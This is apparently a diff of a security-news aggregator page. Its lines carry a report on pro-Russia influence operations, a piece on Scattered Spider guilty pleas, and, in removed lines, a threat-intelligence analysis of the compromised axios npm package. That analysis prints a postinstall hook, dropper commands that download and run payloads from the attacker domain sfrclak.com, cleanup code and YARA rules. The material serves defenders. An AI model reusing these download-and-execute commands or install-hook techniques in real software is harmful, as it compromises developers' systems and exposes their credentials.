+[wiper malware](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook?e=48754805)alongside website defacements containing false surrender messages, or the historic use of "hack and leak" campaigns in which exfiltrated data, sometimes manipulated, is then publicized through an actor-controlled false persona. In some instances, Russian actors may even leverage direct cyber espionage targeting as a way to achieve psychological effects, intending to influence victims' behavior through intimidation. -
+Media Mimicry: Pro-Russia actors have attempted to mimic legitimate media at scale and through a variety of means, including via the wholesale appropriation of legitimate media brands or developing inauthentic media brands that generally masquerade as independent news sources. These tactics are intended to add a veneer of legitimacy to the promoted narratives.
+-
+Direct Dissemination: Pro-Russia influence actors have used closed communication channels, such as emails, SMS text messages, and messenger apps, to disseminate various types of pro-Russia narratives as an adjunct to or outside typical social media-focused operations.
+Core Ecosystem Components
+The current pro-Russia influence ecosystem operates across a spectrum from official government communications to deniable covert actions conducted by intelligence services and "patriotic" proxies. GTIG identified six core components that represent key activity types (Figure 3). While many elements are state-directed or state-affiliated, the ecosystem is also a cultivated, self-sustaining system: various actors, often without explicit direction, amplify Kremlin-friendly narratives and pursue actions that advance Russia's strategic interests. This fluidity provides resilience and complicates attribution, mirroring the longstanding Kremlin strategy to co-opt non-state actors, including criminal networks for [finance](https://www.rusi.org/explore-our-research/publications/commentary/operation-destabilise-russia-organised-crime-and-illicit-finance) or [illicit logistics](https://www.bbc.com/news/articles/cz91dk0l50no), to achieve state objectives without direct attribution. Although each of the core ecosystem components serves as a unique lever the Russian Government can employ to achieve desired objectives, they are regularly used together. For instance, while the entire pro-Russia hacktivist landscape is not state-sponsored, the Russian intelligence services have used both genuine and fabricated hacktivist personas to launder stolen data as part of blended cyber espionage and IO hybrid operations.
+Figure 3: Core components of the pro-Russia influence ecosystem
+An Interconnected Ecosystem Enhances Influence Utility
+Figure 4 illustrates the complex, interconnected nature of the pro-Russia influence ecosystem by mapping relationships between a selection of key actors and organizations across five of the core components. The ecosystem functions as a cohesive unit, not only through shared objectives, but also through direct cross-component interactions. The Russian Government functions as the sixth core ecosystem component, setting the policy and talking points that inform the ecosystem’s promoted narratives and sponsoring overt and covert assets throughout the other five components diagrammed in Figure 4. Through these levers, the Kremlin fosters the cross-component links that underpin the ecosystem, enhancing its overall utility as a versatile tool of state influence.
+Figure 4: Subset of actors that illustrate how different components of the ecosystem interact with each other
+10 Key Dynamics for Understanding the Pro-Russia Influence Ecosystem
+The scope and diversity of activity in the pro-Russia influence ecosystem challenges defenders tasked with enumerating, tracking, and countering its threats. GTIG has distilled 10 key ecosystem dynamics based on our current understanding of its components and how they each enable covert influence activity. These dynamics frame critical aspects of how activity manifests within the ecosystem, providing a high-level guide to understand and track these threats.
+Large-scale IO campaigns are an integral element of the pro-Russia influence ecosystem. Major pro-Russia IO campaigns have been an enduring feature of the pro-Russia ecosystem, with new campaigns emerging as previous ones fall into inactivity. Maintaining extensive IO campaigns and their associated established influence infrastructure enables proactive [messaging](https://home.treasury.gov/news/press-releases/jy0628) on strategic issues and underpins a capability that can be rapidly adapted for emerging domestic and global priorities.
+-
+Long-established IO campaigns, like Secondary Infektion,
+[pivoted to meet](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine)new strategic needs as Russia’s 2022 invasion of Ukraine began. New IO campaigns, such as “Operation Overload,” subsequently emerged to support the war effort; while Secondary Infektion has become dormant, these “successor” campaigns have since been leveraged to advance other global Russian influence objectives beyond the war itself.
+Pro-Russia actors often prioritize persistence and the range of tactics they leverage reflects this. In the face of public exposure and disruption, pro-Russia actors and their infrastructure have often remained persistent, sometimes making tactical adjustments to mitigate the effects of detection and disruption and other times continuing operations unabated.
+-
+These persistence tactics include the Doppelganger campaign and overt
+[Russian media](https://www.bloomberg.com/news/articles/2023-11-23/ukraine-war-how-kremlin-propaganda-websites-dodge-disinformation-sanctions#xj4y7vzkg)’s respective cycling of domain infrastructure and/or use of mirror domains to overcome exposure, platform bans and sanctions. Influence operators also frequently continue using compromised assets, sometimes mocking their exposure, as seen with the legacy US-targeted NAEBC campaign and the APT44-affiliated hacktivist persona XakNet Team.
+Figure 5: NAEBC-linked persona account mocking public exposure of influence assets (left), and GRU-sponsored XakNet Team persona mocking then-Mandiant (now part of Google Threat Intelligence Group) attribution of the group’s activities to the GRU (right)
+Pro-Russia and Russian cyber espionage groups leverage IO tactics to support their operations and weaponize stolen data and/or illicit access. While less frequent, this [hybrid activity](https://cloud.google.com/blog/topics/threat-intelligence/russian-espionage-influence-ukrainian-military-recruits-anti-mobilization-narratives) is a critical dynamic within the pro-Russia influence ecosystem. GTIG has previously observed operations used to shape narratives around [cyberattacks](https://cloud.google.com/blog/topics/threat-intelligence/gru-disruptive-playbook) and influence events on the ground and to conduct foreign political interference, including the repeated targeting of [foreign elections](https://cloud.google.com/blog/topics/threat-intelligence/cyber-threats-global-elections), reported in Spring 2024. We have attributed some observed instances of this to Russian government-sponsored threat actors.
+-
+Russian state sponsored or pro-Russia hacktivist groups have long relied on public advertisement of real or claimed data exfiltration to highlight their operations, intimidate targets, or sway public opinion. In 2022, UNC4057 (COLDRIVER) used data stolen from espionage targets in a high profile hack-and-leak operation seeking to exacerbate divisions in UK politics. More recently, the self-proclaimed hacktivist group
+[PalachPro](https://cert.gov.ua/article/6287707)claimed in February 2026 to have gained unauthorized access to a Ukrainian government online portal and publicly posted[screenshots](https://caspianpost.com/regions/russian-hackers-target-ukraine-s-starlink-authorisation-service)of the claimed compromise. The Ukrainian government has previously noted that the portal does not store the type of data the threat actor claimed to compromise, suggesting the public posting was likely intended as influence activity, attempting to create the illusion of a more serious threat.
+Figure 6: UNC4057 leak website attempting to inflame public debate
+Pro-Russia hacktivists serve a direct influence function. Modern pro-Russia hacktivism has evolved into an important component of the influence [ecosystem](https://cloud.google.com/blog/topics/threat-intelligence/global-revival-of-hacktivism) that blends [state-backed actors](https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm) leveraging [hacktivist tactics](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) with an evolving cohort of likely third-party hacktivist actors that support Russia's geopolitical interests. Pro-Russia hacktivist groups gain domestic and foreign attention for strategic messaging via their [claimed threat activity](https://cloud.google.com/blog/topics/threat-intelligence/killnet-new-capabilities-older-tactics), amplify narratives directly seeded in overt ecosystem segments, and at times also support traditional IO activity or create a means of plausible deniability for state-sponsored espionage actors.
+-
+The self-proclaimed hacktivist group NoName057(16) emerged following the Russian invasion of Ukraine in 2022, primarily targeting Ukraine and its partners and allies with DDoS attacks and various network intrusions. It has targeted high profile events, such as the Milano Cortina Winter Olympics, institutions like the French National Assembly, and critical infrastructure and transportation targets in Germany. Often their messaging cites grievances with overt acts of Western support for Kyiv, suggesting the group advances Russian interests not only through the targeting of perceived Russian adversaries but also in gaining attention for its pro-Russia messaging.
+Established ecosystem components facilitate the cultivation of new assets and activity. Inter-ecosystem cross-promotion helps overcome challenges of audience building by directing traffic toward [new assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-2022-midterm-elections/), operations, and narratives, enabling rapid deployment of new and existing IO capabilities. This directly supports a self-sustaining cycle that maintains and expands the ecosystem.
+-
+The hacktivist persona JokerDNR played a significant role in amplifying the APT44-linked persona Solntsepek when its doxxing-focused Telegram channel first launched and then again as it began claiming cyber espionage activity.
+Domestic Russian audiences are a longstanding target of the pro-Russia influence ecosystem. Internally directed [influence activity](https://blog.google/threat-analysis-group/prigozhin-interests-and-russian-information-operations/) has often involved the promotion of Kremlin policies and talking points and the denigration of opposition voices and ideas, conducted by both overt and covert segments of the ecosystem.
+-
+Ahead of Russia’s March 2024 presidential election, GTIG identified the hybrid espionage and influence actor UNC5101 register domains and conduct associated influence operations attempting to deceive Russian opposition voters about the timing of an anti-Putin protest.
+Ecosystem actors respond to the same set of internal shifting circumstances and external geopolitical developments, often leading to seemingly similar, but ultimately distinct, activity. These shared drivers and general motivational alignments encourage actors to "spontaneously" coalesce around a particular topic or narrative. While this can appear superficially similar, this phenomenon is distinct from instances of actor coordination and campaign linkages, which is less common.
+Systemic flexibility is a central feature, with influence assets able to mobilize both incrementally and at scale to advance Russian interests. The Russian Government is able to [mobilize assets](https://cloud.google.com/blog/topics/threat-intelligence/information-operations-surrounding-ukraine) across the ecosystem to respond to strategic events. Meanwhile, individual or aligned actors can separately mobilize to address [tactical needs](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions), allowing the ecosystem to concurrently message on multiple issues across different geographies (Figure 7).
+-
+Russia demonstrated its ability to focus the ecosystem on a single strategic issue like the Russian invasion of Ukraine. Simultaneously, discrete assets have addressed tactical events, such as when Portal Kombat briefly
+[promoted](https://cloud.google.com/blog/topics/threat-intelligence/pro-russia-information-operations-drone-incursions)narratives about a Russian drone incursion into Poland concurrently with other covert pro-Russia influence activity.
+Figure 7: Tactical responses are executed by individual or coordinated/aligned clusters of actors to address emerging developments
+Overt Russian media contributes to, and is connected with, multiple covert influence components. The overt components of Russia's influence infrastructure play a critical role within the broader Russian influence ecosystem beyond the commonly understood function of providing a public platform for government-aligned narratives and official talking points; overt media helps to drive (inform targeting) and amplify covert pro-Russia influence activity, seeding desirable narratives within the ecosystem and providing an indirect conduit between the Kremlin and a disparate array of influence actors. Overt media outlets have directly [coordinated](https://home.treasury.gov/news/press-releases/jy2559) their activity with covert actors and have increasingly employed IO tactics to disseminate their own content in the face of sanctions and platform bans (Figure 8).
+-
+US Government
+[sanctions](https://home.treasury.gov/news/press-releases/jy2559)in late 2024 indicated that Russian state media company Russia Today (RT) directly conducted covert influence operations, including on behalf of the Russian intelligence services. Further, RT employees reportedly interacted with members of the self-proclaimed hacktivist group RaHDit, which has claimed to collaborate with multiple other pro-Russia hacktivist groups, illustrating the layered connections between overt media, Russian intelligence services, and hacktivist groups.
+Figure 8: Overt Russian media maintains multiple links with the covert segments of the ecosystem
+Outsourcing IO capability development and campaign execution to third-party organizations and proxies enables scaling and obfuscation. Outsourcing is used for developing [custom tooling](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan) and bolstering both human and [organizational](https://home.treasury.gov/news/press-releases/jy2559) [capacity](https://home.treasury.gov/news/press-releases/jy2195). While [custom tool](https://www.justice.gov/opa/pr/justice-department-announces-actions-combat-two-russian-state-sponsored-cyber-criminal) development facilitates operators in all phases of the IO lifecycle, Russian government actors can flexibly leverage different models for outsourcing campaign execution based on their specific needs. Proxy actors can also generate plausible deniability (Figure 9).
+-
+GTIG
+[reported](https://cloud.google.com/blog/topics/threat-intelligence/cyber-operations-russian-vulkan)how Russian IT contractor NTC Vulkan (Russian: НТЦ Вулкан) worked with the Russian intelligence services, including providing tooling and support for the GRU unit that sponsors APT44 activity. Separately, US government[sanctions](https://home.treasury.gov/news/press-releases/jy2195)detailed how the Doppelganger campaign is supported by multiple Russian contractors under the sponsorship of the Russian Presidential Administration.
+Figure 9: Outsourcing and proxies support capability development and campaign execution for covert influence activity
+Conclusion
+Multiple factors are propelling the evolution of the pro-Russia influence ecosystem we have observed since Moscow’s full scale invasion of Ukraine four years ago. The Kremlin mobilized the entire ecosystem to support the ongoing conflict, which has provided rapid feedback and driven significant investment in new and established overt and covert influence assets. At the same time, pro-Russia actors are increasingly experimenting with generative AI to enhance their workflows. This condensed period of adaptation, alongside signals suggesting Russia's growing reliance on IO tactics to navigate new challenges, raises concerns regarding how a potentially diversifying pool of actors will leverage advancements in tradecraft and scalability. As Russia seeks to emerge from international isolation and reorients its influence ecosystem back toward global objectives, it is critical for defenders to understand how this ecosystem provides the Kremlin with a durable influence capability in order to better anticipate future Russian influence threats.
+Additional Tools and Resources
+For mitigation and hardening recommendations, please review the following:
+-
+[How to Understand and Action Mandiant's Intelligence on Information Operations](https://cloud.google.com/blog/topics/threat-intelligence/understand-action-intelligence-information-operations) -
+[Proactive Preparation and Hardening to Protect Against Destructive Attacks](https://cloud.google.com/blog/topics/threat-intelligence/preparation-hardening-destructive-attacks) -
+[Linux Endpoint Hardening to Protect Against Malware and Destructive Attacks](https://services.google.com/fh/files/misc/linux-endpoint-hardening-wp-en.pdf) -
+[Distributed Denial of Service (DDoS) Protection Recommendations](https://services.google.com/fh/files/misc/ddos-protection-recommendations-wp-en.pdf)
+Google offers a suite of free of cost tools to help protect high-risk users from the most pervasive digital attacks, to which politicians, journalists, and campaigns are often most vulnerable. Examples include protecting accounts from targeted attacks with [Advanced Protection Program](https://landing.google.com/advancedprotection/) and safeguarding campaign websites from DDoS attacks with [Project Shield](https://projectshield.withgoogle.com/landing).</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
         <div id="art-6" class="article-body">
+            <h2 class="article-title">Hackers now exploit critical Oracle E-Business flaw in attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/new-oracle-e-business-suite-flaw-now-exploited-in-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">Attackers have begun exploiting a critical vulnerability (CVE-2026-46817) in the Oracle E-Business Suite (EBS) financial application, according to threat intelligence company Defused. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/scattered-spider-hackers-plead-guilty-on-day-1-of-trial/" target="_blank">Original Link</a></p>
             <div class="content-text">Two men pleaded guilty in the United Kingdom this week to criminal charges stemming from an August 2024 cyberattack that crippled Transport for London, the entity responsible for the public transport network in the Greater London area. The duo were key members of a prolific cybercrime group known as Scattered Spider, and their guilty pleas came on the first day of what was expected to be a six-week trial.
@@ -617,6 +408,9 @@ The U.S. Department of Justice says three alleged Scattered Spider defendants in
 Flowers and Jubair are slated to be sentenced in a London court on July 15, 2026.
 More stupid young people throwing their lives away.
 They will serve some time and get a great job working at a GCHQ cut out org via the The “Cyber Choices” Program, if not there then some big cyber security company will hire them, its a bit like Better Call Saul, the best criminal lawyers are criminals!
+Why is it that pretty much every time cyber crooks are punished, someone will chime in and claim they will get a cushy job some letter agency or security consultancy?
+To be hired you need the right skill set. And much more importantly: you need to be deemed trustworthy. That rules out pretty much any job that requires clearance, because for some crazy reason, most gov’t agencies do not consider ex-cons trustworthy.
+Nobody’s going to bust out a couple of shameless, reckless social engineering guys. It’s really not like these guys are misunderstood geniuses who were too curious for their own good.
 Smart young adults potentially throwing their future away. Sigh…
 A friend of my nephew is a 23 year old guy with obvious talent who seems to be uninterested in a job.
 I think he wants me to retire and has the idea that he can take my job. However, he has neither the knowledge nor the temperament to do the job. He’s too much of a hothead and thinks that he knows absolutely everything about everything, especially computers and electronics.
@@ -652,7 +446,7 @@ Shouldn’t this sort of post be on something like t4r4ñt3lla.onion or somethin
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
@@ -748,7 +542,7 @@ Very interesting article, I always say there’s only one internet and there’s
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/how-to-train-your-dragons-analysts" target="_blank">Original Link</a></p>
             <div class="content-text">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team
@@ -803,224 +597,6 @@ The graphic below gives a quick overview of the assessment, and which categories
 In addition to all the engagement styles we offer above, we are always more than happy to sit down and chat about the security posture of your organization. If something above doesn’t match what you’re looking for, let us know! We also offer customized approaches that may better suit your team’s needs.
 Conclusion
 Picking the right Purple Team assessment for your organization can be a challenging endeavor, whether it be identifying a starting point, or putting together a roadmap for next-steps. TrustedSec’s account managers and consulting team have the skills and expertise to provide actionable guidance to assist your organization at all stages of its journey. If you have questions or are interested in these services, please [get in touch with us](https://trustedsec.com/contact)!</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package/" target="_blank">Original Link</a></p>
-            <div class="content-text">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack
-Google Threat Intelligence Group
-Mandiant
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden, Mon Liclican, Muhammad Umair
-Introduction
-Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package "[axios](https://www.npmjs.com/package/axios)." Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named "plain-crypto-js
-" into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux.
-GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of WAVESHAPER.V2, an updated version of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering) previously used by this threat actor. Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities.
-This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat.
-Campaign Overview
-On March 31, 2026, GTIG observed the introduction of plain-crypto-js
-version 4.2.1 as a dependency in the legitimate axios
-package version 1.14.1. Analysis indicates the maintainer account associated with the axios
-package was compromised, with the associated email address changed to an attacker-controlled account (ifstap@proton.me
-).
-The threat actor used the postinstall
-hook within the "package.json"
-file of the malicious dependency to achieve silent execution. Upon installation of the compromised axios
-package, NPM automatically executes an obfuscated JavaScript dropper named "setup.js"
-in the background.
-"scripts": {
-"test": "echo \"Error: no test specified\" && exit 1",
-"postinstall": "node setup.js"
-}
-Malware Analysis
-The plain-crypto-js
-package serves as a payload delivery vehicle. The core component, SILKBELL, setup.js
-(SHA256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
-), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads.
-The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&C) URL and host OS execution commands. To evade static analysis, it dynamically loads fs
-, os
-, and execSync
-. After successfully dropping the secondary payload, setup.js
-attempts to delete itself and revert the modified package.json
-to hide forensic traces of the postinstall
-hook.
-Operating System-Specific Execution Paths
-Depending on the identified platform, the dropper executes the following routines.
-Windows
-The dropper actively hunts for the native powershell.exe
-binary. To evade detection, it copies the legitimate executable to %PROGRAMDATA%\wt.exe
-. It then downloads a PowerShell script via curl
-using the POST body packages.npm.org/product1
-and saves it to the user's AppData Temp directory (e.g., %TEMP%\6202033.ps1
-). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags.
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > %TEMP%\6202033.ps1
-& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033 & del ""PS_PATH"" /f", 0, False
-macOS
-The malware uses bash
-and curl
-to download a native Mach-O binary payload to /Library/Caches/com.apple.act.mond
-using the POST body packages.npm.org/product0
-. It modifies permissions to make the file executable and launches it via zsh
-in the background.
-try
-do shell script "
-curl -o /Library/Caches/com.apple.act.mond
--d packages.npm.org/product0
--s http://sfrclak.com:8000/6202033
-&& chmod 770 /Library/Caches/com.apple.act.mond
-&& /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
-&> /dev/null"
-"
-end try
-do shell script "rm -rf tmp/6202033"
-Linux
-The script downloads a Python backdoor to /tmp/ld.py
-using the POST body packages.npm.org/product2
-.
-Cleanup
-Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as "package.md
-".
-const K = __filename;
-t.unlink(K, (x => {}))
-t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord)
-WAVESHAPER.V2 Backdoor Capabilities
-The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent:
-mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
-Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1.
-On Windows, persistence is achieved by creating a hidden batch file (%PROGRAMDATA%\system.bat
-) and adding a new entry named MicrosoftUpdate
-to HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
-to launch it at logon.
-WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities:
--
-Reconnaissance: Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists.
--
-Command Execution: Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size.
--
-File System Enumeration: Returns detailed metadata for requested target directories by continuously recursing through the file system.
-Attribution
-GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure (sfrclak[.]com
-resolving to 142.11.206.73
-) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations.
-Furthermore, WAVESHAPER.V2 is a direct evolution of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories (e.g., /Library/Caches/com.apple.act.mond
-).
-Outlook and Implications
-The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn’t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations.
-Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term.
-Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks.
-Remediation
-GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring.
--
-Version Control: Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier).
--
-Dependency Pinning: Pin axios to a known safe version in your
-package-lock.json
-to prevent accidental upgrades. -
-Malicious Package Audit: Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like
-[Wiz](https://wiz.io)or[Open Source Insights](https://deps.dev/)for deeper dependency auditing. -
-Pipeline Security: Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling "latest" versions before redeploying with pinned, safe versions.
--
-Incident Response: If
-plain-crypto-js
-is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine. -
-Network Defense: Block all traffic to sfrclak[.]com and the command & control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain.
--
-Cache Remediation: Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs.
--
-Endpoint Protection: Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs).
--
-Credential Management: Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs).
-- Developer Sandboxing & Secret Vaulting: Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using
-[aws-vault](https://github.com/ByteNess/aws-vault?tab=readme-ov-file). This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine.
-Indicators of Compromise (IOCs)
-To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free [GTI Collection](https://www.virustotal.com/gui/collection/c5adea0fa8aac14e6aabd8d3d4a1d19e4cd0eb76e679f2e9d3fed2a3170c09bb/summary) for registered users.
-Network Indicators
-File Indicators
-YARA Rules
-These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation.
-rule G_Backdoor_WAVESHAPER.V2_PS_1
-{
-meta:
-description = "Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution"
-author = "GTIG"
-md5 = "04e3073b3cd5c5bfcde6f575ecf6e8c1"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Windows"
-family = "WAVESHAPER.V2"
-strings:
-$ss1 = "packages.npm.org/product1" ascii wide nocase
-$ss2 = "Extension.SubRoutine" ascii wide nocase
-$ss3 = "rsp_peinject" ascii wide nocase
-$ss4 = "rsp_runscript" ascii wide nocase
-$ss5 = "rsp_rundir" ascii wide nocase
-$ss6 = "Init-Dir-Info" ascii wide nocase
-$ss7 = "Do-Action-Ijt" ascii wide nocase
-$ss8 = "Do-Action-Scpt" ascii wide nocase
-condition:
-uint16(0) != 0x5A4D and filesize < 100KB and 5 of ($ss*)
-}
-rule G_Hunting_Downloader_suspected_UNC1069_PS_1
-{
-meta:
-description = "Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2"
-author = "GTIG"
-md5 = "089e2872016f75a5223b5e02c184dfec"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Windows"
-strings:
-$ss1 = "start /min powershell -w h" ascii wide nocase
-$ss2 = "[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString" ascii wide nocase
-$ss3 = "Invoke-WebRequest -UseBasicParsing" ascii wide nocase
-$ss4 = "-Method POST -Body" ascii wide nocase
-$ss5 = "packages.npm.org/product1" ascii wide nocase
-condition:
-uint16(0) != 0x5A4D and filesize < 5KB and all of them
-}
-rule G_Hunting_Downloader_SILKBELL_1
-{
-meta:
-description = "Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2"
-author = "GTIG"
-md5 = "7658962ae060a222c0058cd4e979bfa1"
-date_created = "2026/03/31"
-date_modified = "2026/03/31"
-rev = 1
-platforms = "Any"
-strings:
-$ss1 = "OrDeR_7077" ascii wide fullword
-$ss2 = "String.fromCharCode(S^a^333)" ascii wide
-$ss3 = "\"TE9DQUw^\".replaceAll(\"^\",\"=\")" ascii wide
-$ss4 = "\"UFM_\".replaceAll(\"_\",\"=\")" ascii wide
-$ss5 = "\"U0NSXw--\".replaceAll(\"-\",\"=\")" ascii wide
-$ss6 = "\"UFNfQg--\".replaceAll(\"-\",\"=\")" ascii wide
